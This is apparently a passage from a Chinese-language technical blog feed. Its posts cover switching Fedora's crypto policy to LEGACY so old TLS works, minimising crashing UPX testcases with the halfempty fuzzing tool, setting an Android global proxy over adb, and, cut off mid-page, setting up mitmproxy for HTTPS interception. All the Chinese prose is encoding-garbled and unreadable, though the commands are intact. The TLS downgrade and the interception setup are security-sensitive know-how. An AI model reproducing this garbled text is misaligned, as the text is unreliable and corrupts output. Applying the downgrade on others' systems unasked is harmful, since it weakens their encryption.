href="https://bugzilla.mozilla.org/show_bug.cgi?id=1674092#c11">https://bugzilla.mozilla.org/show_bug.cgi?id=1674092#c11</a></p><p>åŸæ¥ Fedora è¿˜æœ‰ä¸ª <code>StrongCryptoSettings</code> ï¼Œçœ‹æ–‡æ¡£å¯ä»¥ä¿®æ”¹</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">update</span>-crypto-policies --<span class="hljs-keyword">set</span> DEFAULT:FEDORA32<br><span class="hljs-keyword">update</span>-crypto-policies --<span class="hljs-keyword">set</span> LEGACY<br>reboot<br></code></pre></td></tr></table></figure><p>å…³é”®çš„å†…å®¹å°±æ˜¯ä¸‹é¢è¿™å‡ è¡Œ</p><p>cat &#x2F;etc&#x2F;crypto-policies&#x2F;state&#x2F;CURRENT.pol</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">min_tls_version</span> = TLS1.<span class="hljs-number">2</span><br><span class="hljs-attribute">protocol</span> = TLS1.<span class="hljs-number">3</span> TLS1.<span class="hljs-number">2</span> DTLS1.<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œåå˜ä¸º</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">min_tls_version</span> = TLS1.<span class="hljs-number">0</span><br><span class="hljs-attribute">protocol</span> = TLS1.<span class="hljs-number">3</span> TLS1.<span class="hljs-number">2</span> TLS1.<span class="hljs-number">1</span> TLS1.<span class="hljs-number">0</span> DTLS1.<span class="hljs-number">2</span> DTLS1.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>é‡å¯ç³»ç»Ÿåï¼Œåˆå¯ä»¥å¼€å¿ƒåœ°ä½¿ç”¨ ThunderBird äº† ^_^</p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>halfempty çš„ä¸€äº›ä½¿ç”¨è¯´æ˜</title>
    <link href="/cn/halfempty/"/>
    <url>/cn/halfempty/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/googleprojectzero/halfempty">https://github.com/googleprojectzero/halfempty</a></p><p>google P0 <a href="https://twitter.com/taviso">@taviso</a> æä¾›çš„ testcase å¹¶è¡Œå¿«é€Ÿç²¾ç®€å·¥å…· ï¼ˆA fast, parallel test case minimization toolï¼‰<br>éœ€è¦æ³¨æ„çš„æ˜¯ halfempty åªèƒ½ç²¾ç®€å¯¼è‡´ç›®æ ‡ç¨‹åº crash çš„ testcaseï¼Œå¦‚æœ testcase ä¸å¯¼è‡´ç›®æ ‡ç¨‹åº crashï¼Œ è¿˜æ˜¯éœ€è¦ä½¿ç”¨ afl-tmin ç±»ä¼¼çš„å·¥å…·æ ¹æ® coverage æ¥ç²¾ç®€ã€‚</p><p>halfempty å·¥å…·å‘æµ‹è¯•è„šæœ¬ä¼ é€’å†…å®¹æ—¶ä½¿ç”¨çš„æ˜¯ pipeï¼Œ å¦‚æœæµ‹è¯•çš„ç¨‹åºåªæ¥å—æ–‡ä»¶è·¯å¾„ä½œä¸ºå‚æ•°æ—¶ï¼Œéœ€è¦ä¸€äº›æŠ€å·§ï¼ŒREADME è™½ç„¶æœ‰æåŠä½†æ˜¯è¯´çš„æ¯”è¾ƒæ™¦æ¶©ã€‚</p><p>ä»¥ upx ä¸ºä¾‹ï¼Œupx çš„å‘½ä»¤è¡Œå¸®åŠ©å¦‚ä¸‹</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs stata">root@fuzzing-5:/mnt/disk/halfempty# ./upx.out_x86-64<br>                       Ultimate Packer <span class="hljs-keyword">for</span> eXecutables<br>                          <span class="hljs-keyword">Copyright</span> (C) 1996 - 2020<br>UPX git-d7ba31+ Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd 2020<br><br>Usage: upx.out_x86-64 [-123456789dlthVL] [-qvfk] [-o <span class="hljs-keyword">file</span>] <span class="hljs-keyword">file</span>..<br><br>Commands:<br>  -1     <span class="hljs-keyword">compress</span> faster                   -9    <span class="hljs-keyword">compress</span> better<br>  -<span class="hljs-keyword">d</span>     decompress                        -<span class="hljs-keyword">l</span>    <span class="hljs-keyword">list</span> compressed <span class="hljs-keyword">file</span><br>  -t     <span class="hljs-keyword">test</span> compressed <span class="hljs-keyword">file</span>              -V    <span class="hljs-keyword">display</span> <span class="hljs-keyword">version</span> number<br>  -<span class="hljs-keyword">h</span>     give <span class="hljs-keyword">more</span> <span class="hljs-keyword">help</span>                    -<span class="hljs-keyword">L</span>    <span class="hljs-keyword">display</span> software license<br>Options:<br>  -q     be quiet                          -v    be verbose<br>  -oFILE write output to &#x27;<span class="hljs-keyword">FILE</span>&#x27;<br>  -f     force compression of suspicious files<br>  -k     <span class="hljs-keyword">keep</span> backup files<br><span class="hljs-keyword">file</span>..   executables to (<span class="hljs-keyword">de</span>)<span class="hljs-keyword">compress</span><br><br><span class="hljs-keyword">Type</span> &#x27;upx.out_x86-64 --<span class="hljs-keyword">help</span>&#x27; <span class="hljs-keyword">for</span> <span class="hljs-keyword">more</span> detailed <span class="hljs-keyword">help</span>.<br><br>UPX comes with ABSOLUTELY <span class="hljs-keyword">NO</span> WARRANTY; <span class="hljs-keyword">for</span> details visit https:<span class="hljs-comment">//upx.github.io</span><br></code></pre></td></tr></table></figure><p>upx åªèƒ½ä½¿ç”¨æ–‡ä»¶è·¯å¾„ä½œä¸ºå‚æ•°ï¼Œ æ¯”å¦‚åƒè¿™æ ·æ‰§è¡Œå‘½ä»¤ã€‚ <code>./upx.out_x86-64 crash.upx</code></p><p>æŒ‰ç…§ README ä¸­çš„ä¾‹å­ç¼–å†™æµ‹è¯•è„šæœ¬ test.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br>./upx.out_x86-64 <span class="hljs-variable">$1</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> $? -eq 139; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œçš„æ—¶å€™ä¼šæŠ¥é”™</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gams">./halfempty ./test.sh  crash.upx<br>â•­â”‚   â”‚ â”€â”€ halfempty â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ v0<span class="hljs-number">.30</span> â”€â”€<br>â•°â”‚ <span class="hljs-number">16</span>â”‚ A fast, parallel testcase minimization tool<br> â•°â”€â”€â”€â•¯ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ by @taviso â”€â”€<br><br>Input <span class="hljs-keyword">file</span> <span class="hljs-string">&quot;crash.upx&quot;</span> is now <span class="hljs-number">19088</span> bytes, starting strategy <span class="hljs-string">&quot;bisect&quot;</span>...<br><span class="hljs-function"><span class="hljs-title">Verifying</span></span> the original input executes successfully... (skip with --noverify)<br><span class="hljs-comment">** Message: This program expected `./test1.sh` to return successfully</span><br><span class="hljs-comment">** Message: for the original input (i.e. exitcode zero).</span><br><span class="hljs-comment">** Message: Try it yourself to verify it&#x27;s working.</span><br><span class="hljs-comment">** Message: Use a command like: `cat crash.upx | ./test.sh || echo failed`</span><br><br><span class="hljs-comment">** (halfempty:2477): WARNING **: Strategy &quot;bisect&quot; failed, cannot continue.</span><br></code></pre></td></tr></table></figure><p>æ­£ç¡®çš„æ–¹æ³•æ˜¯ä½¿ç”¨ä¸´æ—¶æ–‡ä»¶ï¼Œå› ä¸º halfempty æ˜¯ä¸€ä¸ªå¹¶è¡Œçš„å·¥å…·ï¼Œæ¯æ¬¡ä½¿ç”¨çš„ä¸´æ—¶æ–‡ä»¶éƒ½åº”è¯¥ä¸ä¸€æ ·ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br>tempfile=`<span class="hljs-built_in">mktemp</span>` &amp;&amp; <span class="hljs-built_in">cat</span> &gt; <span class="hljs-variable">$&#123;tempfile&#125;</span><br><br>./upx.out_x86-64 <span class="hljs-variable">$&#123;tempfile&#125;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> $? -eq 139; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œåçš„è¾“å‡ºï¼Œå¤§è‡´å¦‚ä¸‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">root@fuzzing-5:/mnt/disk/halfempty# ./halfempty  ./test.sh  crash.upx <br>â•­â”‚   â”‚ â”€â”€ halfempty â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ v0.30 â”€â”€<br>â•°â”‚ 16â”‚ A fast, parallel testcase minimization<span class="hljs-built_in"> tool</span><br><span class="hljs-built_in"></span> â•°â”€â”€â”€â•¯ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ by @taviso â”€â”€<br><br>Input file <span class="hljs-string">&quot;crash.upx&quot;</span> is now 19088 bytes, starting strategy <span class="hljs-string">&quot;bisect&quot;</span><span class="hljs-built_in">..</span>.<br>Verifying the original input executes successfully<span class="hljs-built_in">..</span>. (skip with --noverify)<br>The original input file succeeded after 0.0 seconds.<br>New finalized size: 19088 (<span class="hljs-attribute">depth</span>=2) <span class="hljs-attribute">real</span>=0.0s, <span class="hljs-attribute">user</span>=0.0s, <span class="hljs-attribute">speedup</span>=~-0.0s<br><span class="hljs-attribute">treesize</span>=6654, <span class="hljs-attribute">height</span>=6376, <span class="hljs-attribute">unproc</span>=0, <span class="hljs-attribute">real</span>=4.4^C <span class="hljs-attribute">user</span>=19.3s, <span class="hljs-attribute">speedup</span>=~14.9s<br></code></pre></td></tr></table></figure><p>å·²ç»å¯ä»¥æ­£å¸¸è¿è¡Œäº†ã€‚å¦‚æœæ‰§è¡Œè¿‡ç¨‹ä¸­é‡ä¸Šé•¿æ—¶é—´çš„å¡é¡¿ï¼Œéœ€è¦ä½¿ç”¨ <code>--timeout</code> å‚æ•°è®¾ç½®è¶…æ—¶æ—¶é—´ã€‚</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq">./halfempty --help-all | <span class="hljs-type">grep</span> <span class="hljs-built_in">timeout</span><br>  -T, --<span class="hljs-built_in">timeout</span>=seconds                   Maximum child execution <span class="hljs-built_in">time</span> (default=unlimited).<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨ Android æ‰‹æœºä¸Šçš„ä½¿ç”¨ stunnel  ï¼ˆä¸éœ€è¦ root ï¼‰</title>
    <link href="/cn/android_stunnel/"/>
    <url>/cn/android_stunnel/</url>
    
    <content type="html"><![CDATA[<h2 id="â˜†-Android-stunnel"><a href="#â˜†-Android-stunnel" class="headerlink" title="â˜† Android stunnel"></a>â˜† Android stunnel</h2><p><a href="https://github.com/comp500/SSLSocks.git">https://github.com/comp500/SSLSocks.git</a>  è¿™ä¸ªé¡¹ç›®å¯ä»¥ä½¿ç”¨ android ç‰ˆæœ¬çš„ stunnel, å…¶å®å°±æ˜¯è°ƒç”¨ <a href="https://www.stunnel.org/downloads/stunnel-5.57-android.zip">https://www.stunnel.org/downloads/stunnel-5.57-android.zip</a></p><p>å…·ä½“é…ç½®å’Œä½¿ç”¨å‘½ä»¤è¡Œå·®è·ä¸å¤§ï¼Œå‚è€ƒï¼š<br><a href="https://github.com/comp500/SSLSocks/blob/master/README.md">https://github.com/comp500/SSLSocks/blob/master/README.md</a><br><a href="https://hamy.io/post/0011/how-to-run-stunnel-on-your-android-device/">https://hamy.io/post/0011/how-to-run-stunnel-on-your-android-device/</a></p><h2 id="â˜†-è®¾ç½®å…¨å±€ä»£ç†"><a href="#â˜†-è®¾ç½®å…¨å±€ä»£ç†" class="headerlink" title="â˜† è®¾ç½®å…¨å±€ä»£ç†"></a>â˜† è®¾ç½®å…¨å±€ä»£ç†</h2><ol><li>åœ¨ wifi è¿æ¥çš„æƒ…å†µ</li></ol><p>æ‰“å¼€wifi åˆ—è¡¨ -&gt; é•¿æŒ‰è¿æ¥çš„ wifi  -&gt; ç‚¹å‡»ä¿®æ”¹ -&gt; é«˜çº§é€‰é¡¹ -&gt; å¡«å†™ä»£ç†ç›¸å…³ä¿¡æ¯</p><ol start="2"><li>ä½¿ç”¨ adb shell æ‰§è¡Œå‘½ä»¤</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">adb</span> shell settings put global http_proxy <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.xx.xxx:<span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><ol start="3"><li>Android Proxy Toggle</li></ol><p><a href="https://github.com/theappbusiness/android-proxy-toggle.git">https://github.com/theappbusiness/android-proxy-toggle.git</a></p><p>è¦æ­£å¸¸ä½¿ç”¨ app éœ€è¦ç”¨ adb shell è¿æ¥ä¸Šè®¾ç½®ç›¸åº”çš„æƒé™ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">adb shell pm grant com<span class="hljs-selector-class">.kinandcarta</span><span class="hljs-selector-class">.create</span><span class="hljs-selector-class">.proxytoggle</span> android<span class="hljs-selector-class">.permission</span>.WRITE_SECURE_SETTINGS<br></code></pre></td></tr></table></figure><p>OnePlus 7T å‡çº§åˆ° Android 12 åï¼Œæ‰§è¡Œä¸Šé¢çš„å‘½ä»¤å°†å‡ºé”™:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus">OnePlus7T:/ $ pm grant com<span class="hljs-selector-class">.kinandcarta</span><span class="hljs-selector-class">.create</span><span class="hljs-selector-class">.proxytoggle</span> android<span class="hljs-selector-class">.permission</span><span class="hljs-selector-class">.WRITE_SECURE_SETTINGS</span><br><br>Exception occurred while executing <span class="hljs-string">&#x27;grant&#x27;</span>:<br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.SecurityException</span>: grantRuntimePermission: Neither user <span class="hljs-number">2000</span> nor current process has android<span class="hljs-selector-class">.permission</span><span class="hljs-selector-class">.GRANT_RUNTIME_PERMISSIONS</span>.<br>        at android<span class="hljs-selector-class">.app</span><span class="hljs-selector-class">.ContextImpl</span><span class="hljs-selector-class">.enforce</span>(ContextImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">2187</span>)<br>        at android<span class="hljs-selector-class">.app</span><span class="hljs-selector-class">.ContextImpl</span><span class="hljs-selector-class">.enforceCallingOrSelfPermission</span>(ContextImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">2215</span>)<br>        at com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.pm</span><span class="hljs-selector-class">.permission</span><span class="hljs-selector-class">.PermissionManagerService</span><span class="hljs-selector-class">.grantRuntimePermissionInternal</span>(PermissionManagerService<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1477</span>)<br>        at com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.pm</span><span class="hljs-selector-class">.permission</span><span class="hljs-selector-class">.PermissionManagerService</span><span class="hljs-selector-class">.grantRuntimePermission</span>(PermissionManagerService<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1459</span>)<br>        at android<span class="hljs-selector-class">.permission</span><span class="hljs-selector-class">.PermissionManager</span><span class="hljs-selector-class">.grantRuntimePermission</span>(PermissionManager<span class="hljs-selector-class">.java</span>:<span class="hljs-number">378</span>)<br>        at com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.pm</span><span class="hljs-selector-class">.PackageManagerShellCommand</span><span class="hljs-selector-class">.runGrantRevokePermission</span>(PackageManagerShellCommand<span class="hljs-selector-class">.java</span>:<span class="hljs-number">2419</span>)<br>        at com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.pm</span><span class="hljs-selector-class">.PackageManagerShellCommand</span><span class="hljs-selector-class">.onCommand</span>(PackageManagerShellCommand<span class="hljs-selector-class">.java</span>:<span class="hljs-number">260</span>)<br>        at com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.modules</span><span class="hljs-selector-class">.utils</span><span class="hljs-selector-class">.BasicShellCommandHandler</span><span class="hljs-selector-class">.exec</span>(BasicShellCommandHandler<span class="hljs-selector-class">.java</span>:<span class="hljs-number">97</span>)<br>        at android<span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.ShellCommand</span><span class="hljs-selector-class">.exec</span>(ShellCommand<span class="hljs-selector-class">.java</span>:<span class="hljs-number">38</span>)<br>        at com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.pm</span><span class="hljs-selector-class">.PackageManagerService</span><span class="hljs-selector-class">.onShellCommand</span>(PackageManagerService<span class="hljs-selector-class">.java</span>:<span class="hljs-number">25948</span>)<br>        at android<span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.Binder</span><span class="hljs-selector-class">.shellCommand</span>(Binder<span class="hljs-selector-class">.java</span>:<span class="hljs-number">970</span>)<br>        at android<span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.Binder</span><span class="hljs-selector-class">.onTransact</span>(Binder<span class="hljs-selector-class">.java</span>:<span class="hljs-number">854</span>)<br>        at android<span class="hljs-selector-class">.content</span><span class="hljs-selector-class">.pm</span>.IPackageManager<span class="hljs-variable">$Stub</span><span class="hljs-selector-class">.onTransact</span>(IPackageManager<span class="hljs-selector-class">.java</span>:<span class="hljs-number">4818</span>)<br>        at com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.pm</span><span class="hljs-selector-class">.PackageManagerService</span><span class="hljs-selector-class">.onTransact</span>(PackageManagerService<span class="hljs-selector-class">.java</span>:<span class="hljs-number">8987</span>)<br>        at android<span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.Binder</span><span class="hljs-selector-class">.execTransactInternal</span>(Binder<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1226</span>)<br>        at android<span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.Binder</span><span class="hljs-selector-class">.execTransact</span>(Binder<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1163</span>)<br></code></pre></td></tr></table></figure><p>å°‘æ•°æ´¾çš„æ–‡ç«  <a href="https://sspai.com/post/67110">åœ¨ ColorOS ä¸Šå… root ç©æœºï¼Œè¯·å…ˆæ‰“å¼€è¿™ä¸ªå¼€å…³</a> ä¸­æŒ‡å‡ºéœ€è¦åœ¨å¼€å‘è€…é€‰é¡¹ä¸­<br>å¼€å¯ <code>ç¦æ­¢æƒé™ç›‘æ§</code>ã€‚</p><p>å¼€å¯åå¯ä»¥æ­£å¸¸æ‰§è¡Œ <code>pm grant</code> å‘½ä»¤ï¼Œæ‰§è¡ŒæˆåŠŸåå¯ä»¥ä½¿ç”¨ <code>dumpsys package &lt;package name&gt;</code> åˆ—å‡ºæ‰€æœ‰çš„æƒé™ã€‚</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">dumpsys <span class="hljs-keyword">package</span> <span class="hljs-title">com.kinandcarta.create.proxytoggle | grep perm</span>ission<br><br>    requested permissions:<br>      android.permission.WRITE_SECURE_SETTINGS<br>      android.permission.WRITE_SETTINGS<br>    install permissions:<br>      android.permission.WRITE_SECURE_SETTINGS: granted=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h2 id="æ¢å¤æ— ä»£ç†"><a href="#æ¢å¤æ— ä»£ç†" class="headerlink" title="æ¢å¤æ— ä»£ç†"></a>æ¢å¤æ— ä»£ç†</h2><p>å¦‚æœé‡ä¸Šä¸€äº›å¼‚å¸¸æƒ…å†µï¼Œæ¯”å¦‚é”™è¯¯å¸è½½äº† Android Proxy Toggle, å¯ä»¥ä½¿ç”¨ä¸‹é¢å‘½ä»¤å»æ‰ Android å…¨å±€ä»£ç†ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">adb shell settings delete global http_proxy<br>adb shell settings delete global global_http_proxy_host<br>adb shell settings delete global global_http_proxy_port<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mitmproxy ç®€ä»‹</title>
    <link href="/cn/mitmproxy/"/>
    <url>/cn/mitmproxy/</url>
    
    <content type="html"><![CDATA[<p>ä¸»è¦ç‰¹è‰²ï¼šIntercept HTTP &amp; HTTPS requests and responses and modify them on the fly</p><p>ä½¿ç”¨pythonç¼–å†™ï¼Œå¯ä»¥åœ¨windowsï¼ŒLinuxï¼Œ Mac ä¸‹è¿è¡Œï¼Œè¿™ç‚¹æ¯” fiddler æœ‰ä¼˜åŠ¿ã€‚å¯ä»¥ä¿®æ”¹æŠ¥æ–‡å†…å®¹ï¼Œè¿™ç‚¹å¾ˆä¸é”™ã€‚</p><ul><li>å®˜æ–¹ç½‘ç«™ï¼š <a href="https://www.mitmproxy.org/">https://www.mitmproxy.org/</a></li><li>æ–‡æ¡£ï¼š<a href="https://docs.mitmproxy.org/stable/">https://docs.mitmproxy.org/stable/</a></li></ul><h2 id="â˜†-1-å®‰è£…"><a href="#â˜†-1-å®‰è£…" class="headerlink" title="â˜† 1. å®‰è£…"></a>â˜† 1. å®‰è£…</h2><p>å‚è€ƒ <a href="https://docs.mitmproxy.org/stable/overview-installation/">https://docs.mitmproxy.org/stable/overview-installation/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dnf install -y python-pip python-devel libffi-devel openssl-devel libxml2-devel libxslt-devel libpng-devel libjpeg-devel<br>sudo pip install mitmproxy  <span class="hljs-comment"># or pip install --user mitmproxy</span><br></code></pre></td></tr></table></figure><h2 id="â˜†-2-åŸºæœ¬ä½¿ç”¨"><a href="#â˜†-2-åŸºæœ¬ä½¿ç”¨" class="headerlink" title="â˜† 2. åŸºæœ¬ä½¿ç”¨"></a>â˜† 2. åŸºæœ¬ä½¿ç”¨</h2><p><code>mitmproxy --listen-host 127.0.0.1 -p 8080</code></p><ul><li><code>--listen-host</code> address to bind address</li><li>-p bind port</li><li>-s â€œscript.py â€“barâ€, â€“script â€œscript.py â€“barâ€  Run a script. Surround with quotes to pass script</li></ul><h3 id="2-1-mitmproxy-ç•Œé¢æ“ä½œ"><a href="#2-1-mitmproxy-ç•Œé¢æ“ä½œ" class="headerlink" title="2.1 mitmproxy ç•Œé¢æ“ä½œ"></a>2.1 mitmproxy ç•Œé¢æ“ä½œ</h3><pre><code class="hljs">- ï¼Ÿ            æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯- h, j, k, l    ä¸Šä¸‹å·¦å³ï¼ŒåŒ vi- enter         è¿›å…¥å…·ä½“æŠ¥æ–‡- q             é€€å‡ºç•Œé¢- tab           è¯¦ç»†æŠ¥æ–‡å†…å®¹é¡µé¢- E             å¯¼å‡ºæŠ¥æ–‡å†…å®¹</code></pre><h2 id="â˜†-3-å¯¼å…¥mitmproxyçš„-CA"><a href="#â˜†-3-å¯¼å…¥mitmproxyçš„-CA" class="headerlink" title="â˜† 3. å¯¼å…¥mitmproxyçš„ CA"></a>â˜† 3. å¯¼å…¥mitmproxyçš„ CA</h2><p>ä½¿ç”¨mitmproxy æœ€å¤§çš„åŸå› å°±æ˜¯å› ä¸ºå®ƒå¯ä»¥å¯¹ä»˜httpsæŠ¥æ–‡ã€‚<br>å‚è€ƒ <a href="https://docs.mitmproxy.org/stable/concepts-certificates/">https://docs.mitmproxy.org/stable/concepts-certificates/</a></p><p>mitmproxy çš„ CA è¯ä¹¦æ”¾åœ¨ ~&#x2F;.mitmproxy ç›®å½•ï¼Œ å¯ä»¥åœ¨ä¸åŒè®¾å¤‡ä¸­æ·»åŠ ã€‚</p><h3 id="3-1-ç›®æ ‡è®¾å¤‡ä¸ºLinux"><a href="#3-1-ç›®æ ‡è®¾å¤‡ä¸ºLinux" class="headerlink" title="3.1 ç›®æ ‡è®¾å¤‡ä¸ºLinux"></a>3.1 ç›®æ ‡è®¾å¤‡ä¸ºLinux</h3><h4 id="å¯¼å…¥è¯ä¹¦"><a href="#å¯¼å…¥è¯ä¹¦" class="headerlink" title="å¯¼å…¥è¯ä¹¦"></a>å¯¼å…¥è¯ä¹¦</h4><ul><li>Google Chrome</li></ul><p>è®¾ç½® -&gt; HTTPS&#x2F;SSL -&gt; è¯ä¹¦ç®¡ç† -&gt; æˆæƒä¸­å¿ƒ</p><ul><li>Firefox</li></ul><p>æ²¡ç”¨Firefoxï¼Œä¼°è®¡ä¹Ÿç±»ä¼¼ã€‚</p><h4 id="è®¾ç½®ä»£ç†"><a href="#è®¾ç½®ä»£ç†" class="headerlink" title="è®¾ç½®ä»£ç†"></a>è®¾ç½®ä»£ç†</h4><p>è®¾ç½®å¥½CAåï¼Œè®¾ç½®æµè§ˆå™¨ä½¿ç”¨mitmproxyä»£ç†å³å¯ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨æµè§ˆå™¨ä»£ç†æ’ä»¶ã€‚</p><h3 id="3-2-ç›®æ ‡è®¾å¤‡ä¸º-Android"><a href="#3-2-ç›®æ ‡è®¾å¤‡ä¸º-Android" class="headerlink" title="3.2 ç›®æ ‡è®¾å¤‡ä¸º Android"></a>3.2 ç›®æ ‡è®¾å¤‡ä¸º Android</h3><h4 